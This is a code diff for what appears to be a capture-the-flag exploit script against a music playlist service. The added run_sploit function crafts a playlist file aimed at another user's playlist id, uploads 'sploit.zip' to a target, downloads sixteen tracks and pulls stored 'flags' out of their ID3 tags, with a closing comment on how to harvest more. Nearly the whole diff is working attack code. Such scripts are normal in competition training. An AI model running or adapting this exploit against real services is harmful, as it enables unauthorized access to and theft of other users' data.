@@ -1,9 +1,26 @@
 import os.path
 import shutil
 import eyed3
+import uuid
+import sys
+import traceback
+import contextlib
 import eyed3.plugins
+from api import Api
 from PIL import Image
 from PIL.PngImagePlugin import PngInfo
+
+
+@contextlib.contextmanager
+def unpack():
+    dirr = str(uuid.uuid4())
+    os.mkdir(dirr)
+    try:
+        yield f"{dirr}"
+    except Exception as e:
+        print(e, traceback.format_exc(), file=sys.stderr)
+    finally:
+        shutil.rmtree(dirr)
 
 
 def create_track_fix(track_name, image_path, artist):
@@ -49,6 +66,33 @@ def create_playlist_file(path_for_playlist):
     shutil.rmtree(str(playlist_dir))
 
 
-create_playlist_file(
-    "/storage/playlists/e915797d-fba2-4b51-aa46-30df6810b387.m3u",
-)
+async def run_sploit(target="127.0.0.1"):
+    pl_id = "e915797d-fba2-4b51-aa46-30df6810b387"
+    create_playlist_file(f"/storage/playlists/{pl_id}.m3u")
+    async with Api(target) as api:
+        await api.upload_playlist("sploit.zip")
+        print(f"Uploaded sploit...")
+        results = []
+        for i in range(16):
+            results.append(await api.download_music(pl_id, i))
+            print(f"Downloading... {i}")
+
+    flags = {}
+    with unpack() as session:
+        for num, music in enumerate(results):
+            with open(f"{session}/stolen_{num}.mp3", mode="wb") as mus:
+                mus.write(music)
+
+            try:
+                music = eyed3.load(f"{session}/stolen_{num}.mp3")
+                flags[num] = music.tag.frame_set[b"TXXX"][0].data.split(b"\x00")[1].decode()
+            except:
+                pass
+
+    print(f"Look at we've got stolen! {flags}")
+
+if __name__ == '__main__':
+    import asyncio
+    asyncio.run(run_sploit())
+
+# to get all flags u need to make more playlists with different sha1 endings
